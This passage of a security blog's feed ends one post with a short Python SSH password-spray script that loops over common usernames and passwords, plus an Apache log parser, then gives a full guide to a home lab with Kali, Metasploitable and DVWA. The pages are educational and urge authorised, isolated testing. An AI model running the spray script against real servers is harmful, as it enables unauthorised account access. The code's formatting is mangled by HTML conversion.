+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>#!/usr/bin/env python3
+"""
+Example of a password spray using SSH (paramiko would be needed).
+This is a conceptual snippet for educational purposes.
+"""
+import paramiko  # Not in standard library, install with: pip install paramiko
+<p>host = input(&quot;Target SSH server: &quot;)<br>
+username_list = [&quot;admin&quot;, &quot;root&quot;, &quot;user&quot;]<br>
+password_list = [&quot;password&quot;, &quot;123456&quot;, &quot;admin&quot;]</p>
+<p>for user in username_list:<br>
+for pwd in password_list:<br>
+try:<br>
+ssh = paramiko.SSHClient()<br>
+ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())<br>
+ssh.connect(host, username=user, password=pwd, timeout=2)<br>
+print(f&quot;[+] Credentials found: {user}:{pwd}&quot;)<br>
+ssh.close()<br>
+break<br>
+except paramiko.AuthenticationException:<br>
+continue<br>
+except Exception as e:<br>
+print(f&quot;[-] Error: {e}&quot;)<br>
+break</code></pre></p>
+</div>
+<div class="callout callout-danger">
+  <i class="fa-solid fa-circle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Important: Use with Caution</div>
+    <div class="callout-body">This type of attack is a form of brute‑forcing and should only be performed during authorised penetration tests. Many systems have rate‑limiting and intrusion detection systems that will block you if you spray too fast.</div>
+  </div>
+</div>
+<h2 id="tool-4-log-parser-for-security-analysis" tabindex="-1">Tool 4: Log Parser for Security Analysis <a class="direct-link" href="#tool-4-log-parser-for-security-analysis" aria-hidden="true">#</a></h2>
+<p>Log analysis is critical for incident response and threat hunting. This script parses Apache access logs and extracts useful information, such as the top IP addresses, most requested URIs, and suspicious patterns.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">log_parser.py</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code>#!/usr/bin/env python3
+"""
+Parse Apache access logs and extract statistics.
+"""
+import re
+from collections import Counter
+<p>log_file = input(&quot;Enter path to access.log: &quot;)</p>
+<p>ip_pattern = r'^(\d+.\d+.\d+.\d+)'<br>
+url_pattern = r'&quot;(GET|POST) (\S+)'</p>
+<p>ips = []<br>
+urls = []</p>
+<p>try:<br>
+with open(log_file, 'r') as f:<br>
+for line in f:<br>
+ip_match = re.search(ip_pattern, line)<br>
+if ip_match:<br>
+ips.append(ip_match.group(1))<br>
+url_match = re.search(url_pattern, line)<br>
+if url_match:<br>
+urls.append(url_match.group(2))<br>
+except FileNotFoundError:<br>
+print(&quot;File not found.&quot;)<br>
+sys.exit(1)</p>
+<p>print(&quot;=== Top IP addresses ===&quot;)<br>
+for ip, count in Counter(ips).most_common(10):<br>
+print(f&quot;{ip}: {count}&quot;)</p>
+<p>print(&quot;\n=== Most requested URIs ===&quot;)<br>
+for url, count in Counter(urls).most_common(10):<br>
+print(f&quot;{url}: {count}&quot;)</code></pre></p>
+</div>
+<p>You can extend this script to detect SQL injection attempts, brute‑force patterns, or unusual user‑agent strings.</p>
+<h2 id="next-steps-and-enhancements" tabindex="-1">Next Steps &amp; Enhancements <a class="direct-link" href="#next-steps-and-enhancements" aria-hidden="true">#</a></h2>
+<p>These scripts are just the beginning. Here are some ideas to take them further:</p>
+<ul>
+<li><strong>Add multithreading</strong> to the subdomain enumerator and log parser to speed them up.</li>
+<li><strong>Use the <code>argparse</code> module</strong> to accept command‑line arguments instead of interactive input.</li>
+<li><strong>Integrate with APIs</strong> (e.g., VirusTotal, Shodan) to enrich your findings.</li>
+<li><strong>Write a custom SSH client</strong> that uses the <code>socket</code> library directly (avoiding <code>paramiko</code>) for more control.</li>
+<li><strong>Create a combined tool</strong> that performs reconnaissance, scanning, and reporting in one pipeline.</li>
+</ul>
+<p>Python empowers you to automate the boring stuff and focus on what matters: understanding the security posture of your targets. Keep coding, keep learning, and always stay ethical.</p>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Programming"/>
+      
+    <category term="Cybersecurity"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Building a Cybersecurity Home Lab on a Budget</title>
+    <link href="https://aimadulislam.dpdns.org/posts/home-lab-setup/"/>
+    <updated>2026-06-15T00:00:00.000Z</updated>
+    <id>https://aimadulislam.dpdns.org/posts/home-lab-setup/</id>
+    <summary type="html"><![CDATA[You don&#39;t need expensive hardware or software to build a professional cybersecurity lab. This guide covers everything.]]></summary>
+    <content type="html"><![CDATA[<h2 id="introduction" tabindex="-1">Introduction <a class="direct-link" href="#introduction" aria-hidden="true">#</a></h2>
+<p>One of the most common questions I get from people starting in cybersecurity is: <em>“Do I need expensive hardware to practise?”</em> The answer is a resounding <strong>no</strong>. With free software like VirtualBox and a handful of purpose‑built virtual machines, you can build a fully functional cybersecurity lab that rivals professional training environments — and it costs you absolutely nothing.</p>
+<p>In this guide, I’ll walk you through exactly what I use in my own lab. You’ll learn how to set up an attack machine (Kali Linux), a vulnerable target (Metasploitable), a web app for practice (DVWA), and even add DFIR tools for forensics and incident response. By the end, you’ll have a safe, isolated playground where you can experiment, break things, and learn without any risk.</p>
+<div class="callout callout-info">
+  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Why a Lab?</div>
+    <div class="callout-body">A home lab is the safest place to learn offensive and defensive techniques. It’s fully under your control, and you never have to worry about accidentally scanning or attacking systems you don’t own.</div>
+  </div>
+</div>
+<h2 id="what-you-need" tabindex="-1">What You Need <a class="direct-link" href="#what-you-need" aria-hidden="true">#</a></h2>
+<p>Here’s the minimal hardware and software required. You probably already have everything on this list:</p>
+<ul>
+<li><strong>Computer</strong> with at least 8 GB of RAM (16 GB recommended) and a 64‑bit processor with virtualization support (VT‑x / AMD‑V).</li>
+<li><strong>50 GB</strong> of free disk space (more if you plan to store many VMs).</li>
+<li><strong>VirtualBox</strong> – free hypervisor available for Windows, macOS, and Linux.</li>
+<li><strong>Internet connection</strong> to download the VMs and tools.</li>
+<li><strong>Patience</strong> – the most important ingredient.</li>
+</ul>
+<h2 id="step-1-install-virtualbox" tabindex="-1">Step 1: Install VirtualBox <a class="direct-link" href="#step-1-install-virtualbox" aria-hidden="true">#</a></h2>
+<p>VirtualBox is the foundation of your lab. It’s open‑source and runs on all major operating systems.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Download & Install VirtualBox</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Go to: https://www.virtualbox.org/wiki/Downloads
+# Download the appropriate installer for your host OS
+# Run the installer and accept all defaults
+<h1 id="verify-installation-in-terminal-if-on-linux" tabindex="-1">Verify installation (in terminal, if on Linux): <a class="direct-link" href="#verify-installation-in-terminal-if-on-linux" aria-hidden="true">#</a></h1>
+<p>virtualbox --version</p>
+<h1 id="example-output-7-0-20r162988" tabindex="-1">Example output: 7.0.20r162988 <a class="direct-link" href="#example-output-7-0-20r162988" aria-hidden="true">#</a></h1>
+<h1 id="on-windows-you-can-check-via-where-virtualbox-or-open-virtualbox-from-the-start-menu" tabindex="-1">On Windows, you can check via 'where virtualbox' or open VirtualBox from the Start menu.</code></pre> <a class="direct-link" href="#on-windows-you-can-check-via-where-virtualbox-or-open-virtualbox-from-the-start-menu" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-2-choose-your-attack-os-kali-linux" tabindex="-1">Step 2: Choose Your Attack OS (Kali Linux) <a class="direct-link" href="#step-2-choose-your-attack-os-kali-linux" aria-hidden="true">#</a></h2>
+<p>Kali Linux is the industry‑standard penetration testing distribution. Instead of a full ISO install, download the pre‑built VirtualBox appliance from the official Kali website – it’s ready to import.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Import Kali Linux VM</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Download the .ova file from: https://www.kali.org/get-kali/#kali-virtual-machines
+#    Choose "VirtualBox" (around 4 GB)
+<h1 id="2-in-virtualbox-go-to-file-import-appliance" tabindex="-1">2. In VirtualBox, go to File → Import Appliance <a class="direct-link" href="#2-in-virtualbox-go-to-file-import-appliance" aria-hidden="true">#</a></h1>
+<h1 id="select-the-ova-file-and-click-import" tabindex="-1">Select the .ova file and click Import <a class="direct-link" href="#select-the-ova-file-and-click-import" aria-hidden="true">#</a></h1>
+<h1 id="3-after-import-start-the-vm" tabindex="-1">3. After import, start the VM. <a class="direct-link" href="#3-after-import-start-the-vm" aria-hidden="true">#</a></h1>
+<h1 id="default-credentials-kali-kali" tabindex="-1">Default credentials: kali / kali <a class="direct-link" href="#default-credentials-kali-kali" aria-hidden="true">#</a></h1>
+<h1 id="4-immediately-change-the-default-password" tabindex="-1">4. Immediately change the default password: <a class="direct-link" href="#4-immediately-change-the-default-password" aria-hidden="true">#</a></h1>
+<p>passwd</p>
+<h1 id="5-update-the-system" tabindex="-1">5. Update the system: <a class="direct-link" href="#5-update-the-system" aria-hidden="true">#</a></h1>
+<p>sudo apt update &amp;&amp; sudo apt upgrade -y</code></pre></p>
+</div>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Kali is Ready</div>
+    <div class="callout-body">You now have a full‑fledged offensive security platform with hundreds of tools pre‑installed – from Nmap and Metasploit to Burp Suite and Wireshark.</div>
+  </div>
+</div>
+<h2 id="step-3-add-vulnerable-targets" tabindex="-1">Step 3: Add Vulnerable Targets <a class="direct-link" href="#step-3-add-vulnerable-targets" aria-hidden="true">#</a></h2>
+<p>To practise attacks, you need a target that is deliberately vulnerable. Two of the best free options are <strong>Metasploitable 2</strong> and <strong>DVWA</strong>.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Set Up Metasploitable 2</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. Download Metasploitable 2 from SourceForge:
+#    https://sourceforge.net/projects/metasploitable/
+<h1 id="2-extract-the-zip-file-inside-you-ll-find-a-vmdk-disk-file" tabindex="-1">2. Extract the ZIP file – inside you'll find a .vmdk disk file. <a class="direct-link" href="#2-extract-the-zip-file-inside-you-ll-find-a-vmdk-disk-file" aria-hidden="true">#</a></h1>
+<h1 id="3-in-virtualbox-create-a-new-vm-choose-linux-ubuntu-64-bit" tabindex="-1">3. In VirtualBox: create a new VM, choose &quot;Linux&quot; → &quot;Ubuntu (64-bit)&quot;. <a class="direct-link" href="#3-in-virtualbox-create-a-new-vm-choose-linux-ubuntu-64-bit" aria-hidden="true">#</a></h1>
+<h1 id="name-it-metasploitable2" tabindex="-1">Name it &quot;Metasploitable2&quot;. <a class="direct-link" href="#name-it-metasploitable2" aria-hidden="true">#</a></h1>
+<h1 id="ram-512-mb-is-enough" tabindex="-1">RAM: 512 MB is enough. <a class="direct-link" href="#ram-512-mb-is-enough" aria-hidden="true">#</a></h1>
+<h1 id="4-at-the-storage-step-select-the-vmdk-file-as-the-hard-disk" tabindex="-1">4. At the storage step, select the .vmdk file as the hard disk. <a class="direct-link" href="#4-at-the-storage-step-select-the-vmdk-file-as-the-hard-disk" aria-hidden="true">#</a></h1>
+<h1 id="5-network-set-adapter-to-host-only-see-next-section" tabindex="-1">5. Network: Set adapter to &quot;Host‑Only&quot; (see next section). <a class="direct-link" href="#5-network-set-adapter-to-host-only-see-next-section" aria-hidden="true">#</a></h1>
+<h1 id="6-boot-the-vm-default-credentials-msfadmin-msfadmin" tabindex="-1">6. Boot the VM. Default credentials: msfadmin / msfadmin. <a class="direct-link" href="#6-boot-the-vm-default-credentials-msfadmin-msfadmin" aria-hidden="true">#</a></h1>
+<h1 id="find-its-ip-address-with" tabindex="-1">Find its IP address with: <a class="direct-link" href="#find-its-ip-address-with" aria-hidden="true">#</a></h1>
+<p>ifconfig</code></pre></p>
+</div>
+<div class="code-block-wrap">
+  <span class="code-block-label">Install DVWA (Damn Vulnerable Web App)</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># On Kali, using Docker is the easiest way:
+sudo apt install docker.io -y
+sudo systemctl start docker
+sudo docker pull vulnerables/web-dvwa
+sudo docker run -d -p 80:80 vulnerables/web-dvwa
+<h1 id="then-open-firefox-in-kali-and-go-to" tabindex="-1">Then open Firefox in Kali and go to: <a class="direct-link" href="#then-open-firefox-in-kali-and-go-to" aria-hidden="true">#</a></h1>
+<h1 id="http-localhost-setup-php" tabindex="-1"><a href="http://localhost/setup.php">http://localhost/setup.php</a> <a class="direct-link" href="#http-localhost-setup-php" aria-hidden="true">#</a></h1>
+<h1 id="click-create-reset-database" tabindex="-1">Click &quot;Create / Reset Database&quot; <a class="direct-link" href="#click-create-reset-database" aria-hidden="true">#</a></h1>
+<h1 id="login-with-admin-password" tabindex="-1">Login with admin / password</code></pre> <a class="direct-link" href="#login-with-admin-password" aria-hidden="true">#</a></h1>
+</div>
+<h2 id="step-4-configure-the-network" tabindex="-1">Step 4: Configure the Network <a class="direct-link" href="#step-4-configure-the-network" aria-hidden="true">#</a></h2>
+<p>To keep your lab isolated from your main network (and the Internet), use <strong>Host‑Only networking</strong> in VirtualBox. This creates a private subnet between your host and the VMs, with no external access.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Set Up Host‑Only Adapter</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># 1. In VirtualBox, go to File → Host Network Manager.
+#    Create a new host‑only network (it usually gets IP range 192.168.56.0/24).
+<h1 id="2-for-each-vm-kali-metasploitable-etc-go-to" tabindex="-1">2. For each VM (Kali, Metasploitable, etc.), go to: <a class="direct-link" href="#2-for-each-vm-kali-metasploitable-etc-go-to" aria-hidden="true">#</a></h1>
+<h1 id="settings-network-adapter-1-attached-to-host-only-adapter" tabindex="-1">Settings → Network → Adapter 1 → Attached to: Host‑Only Adapter. <a class="direct-link" href="#settings-network-adapter-1-attached-to-host-only-adapter" aria-hidden="true">#</a></h1>
+<h1 id="3-start-all-vms-in-kali-check-its-ip" tabindex="-1">3. Start all VMs. In Kali, check its IP: <a class="direct-link" href="#3-start-all-vms-in-kali-check-its-ip" aria-hidden="true">#</a></h1>
+<p>ip a</p>
+<h1 id="4-test-connectivity-to-metasploitable-replace-with-its-ip" tabindex="-1">4. Test connectivity to Metasploitable (replace with its IP): <a class="direct-link" href="#4-test-connectivity-to-metasploitable-replace-with-its-ip" aria-hidden="true">#</a></h1>
+<p>ping 192.168.56.102 -c 4</code></pre></p>
+</div>
+<div class="callout callout-warn">
+  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Never Use NAT for Practice</div>
+    <div class="callout-body">If you leave the network on NAT, your VMs will be able to reach the Internet – and your attack traffic could accidentally leak out. Always use Host‑Only to keep your experiments contained.</div>
+  </div>
+</div>
+<h2 id="step-5-install-dfir-and-analysis-tools" tabindex="-1">Step 5: Install DFIR &amp; Analysis Tools <a class="direct-link" href="#step-5-install-dfir-and-analysis-tools" aria-hidden="true">#</a></h2>
+<p>A good lab isn’t just for hacking – it’s also for learning defensive techniques. Install these free tools on your Kali VM to practise digital forensics and incident response.</p>
+<div class="code-block-wrap">
+  <span class="code-block-label">Install DFIR Tools on Kali</span>
+  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
+  <pre><code># Volatility for memory forensics
+sudo apt install volatility -y
+<h1 id="autopsy-the-sleuth-kit-for-disk-forensics" tabindex="-1">Autopsy / The Sleuth Kit for disk forensics <a class="direct-link" href="#autopsy-the-sleuth-kit-for-disk-forensics" aria-hidden="true">#</a></h1>
+<p>sudo apt install autopsy sleuthkit -y</p>
+<h1 id="ftk-imager-download-from-accessdata-free-for-personal-use" tabindex="-1">FTK Imager (download from AccessData – free for personal use) <a class="direct-link" href="#ftk-imager-download-from-accessdata-free-for-personal-use" aria-hidden="true">#</a></h1>
+<h1 id="or-use-the-built-in-dd-for-raw-disk-images" tabindex="-1">Or use the built‑in 'dd' for raw disk images. <a class="direct-link" href="#or-use-the-built-in-dd-for-raw-disk-images" aria-hidden="true">#</a></h1>
+<h1 id="for-log-analysis-install-splunk-free" tabindex="-1">For log analysis, install Splunk Free: <a class="direct-link" href="#for-log-analysis-install-splunk-free" aria-hidden="true">#</a></h1>
+<h1 id="download-from-splunk-com-and-install-with-dpkg" tabindex="-1">Download from splunk.com and install with dpkg. <a class="direct-link" href="#download-from-splunk-com-and-install-with-dpkg" aria-hidden="true">#</a></h1>
+<h1 id="also-consider-installing-velociraptor-open-source-edr" tabindex="-1">Also consider installing Velociraptor (open‑source EDR): <a class="direct-link" href="#also-consider-installing-velociraptor-open-source-edr" aria-hidden="true">#</a></h1>
+<h1 id="follow-the-official-guide-at-velociraptor-velocidex-com" tabindex="-1">Follow the official guide at velociraptor.velocidex.com</code></pre> <a class="direct-link" href="#follow-the-official-guide-at-velociraptor-velocidex-com" aria-hidden="true">#</a></h1>
+</div>
+These tools will allow you to analyse memory dumps, recover deleted files, and parse logs – exactly what a SOC analyst does daily.
+<h2 id="step-6-start-practising" tabindex="-1">Step 6: Start Practising <a class="direct-link" href="#step-6-start-practising" aria-hidden="true">#</a></h2>
+<p>With your lab up and running, here are a few exercises to get you started:</p>
+<ul>
+<li><strong>Basic recon:</strong> Scan Metasploitable with Nmap: <code>nmap -sV 192.168.56.102</code></li>
+<li><strong>Exploit a service:</strong> Use Metasploit against the vsftpd backdoor (CVE‑2011‑2523).</li>
+<li><strong>Web app testing:</strong> Access DVWA and try SQL injection or XSS on the “Low” security level.</li>
+<li><strong>Forensics:</strong> Simulate a malware infection on a Windows VM, capture a memory dump, and analyse it with Volatility.</li>
+</ul>
+<div class="callout callout-success">
+  <i class="fa-solid fa-circle-check" aria-hidden="true"></i>
+  <div>
+    <div class="callout-title">Your Lab is Ready</div>
+    <div class="callout-body">You now have a complete, free, and legal environment to practise everything from penetration testing to incident response. The best part? You can break, repair, and reconfigure it as many times as you want.</div>
+  </div>
+</div>
+<h2 id="next-steps-and-enhancements" tabindex="-1">Next Steps &amp; Enhancements <a class="direct-link" href="#next-steps-and-enhancements" aria-hidden="true">#</a></h2>
+<p>Once you’ve mastered the basics, consider these upgrades to expand your lab:</p>
+<ul>
+<li><strong>Add a Windows 10 VM</strong> – it’s useful for testing Windows‑specific exploits and practising AD attacks.</li>
+<li><strong>Set up a SIEM</strong> – install Wazuh or ELK to aggregate logs from your VMs.</li>
+<li><strong>Include a pfSense firewall</strong> – learn network segmentation and firewall rules.</li>
+<li><strong>Automate with Ansible</strong> – script the deployment of your lab machines.</li>
+<li><strong>Explore Cloud Labs</strong> – use AWS or Azure free tiers to practise cloud security.</li>
+</ul>
+<p>Building a home lab is a continuous process. Start small, add tools as you need them, and always remember: the goal is to learn, not to own the fanciest setup. Happy hacking!</p>
+]]></content>
+    <author>
+      <name>Aimad Ul Islam</name>
+    </author>
+    
+      
+    <category term="Cybersecurity"/>
+      
+    <category term="Tutorials"/>
+      
+    <category term="Personal Projects"/>
+      
+    
+    
+    
+    <media:thumbnail url="https://i.postimg.cc/hPyNdGVF/Whats-App-Image-2026-07-05-at-9-35-59-PM.jpg"/>
+    
+  </entry>
+  
+</feed>
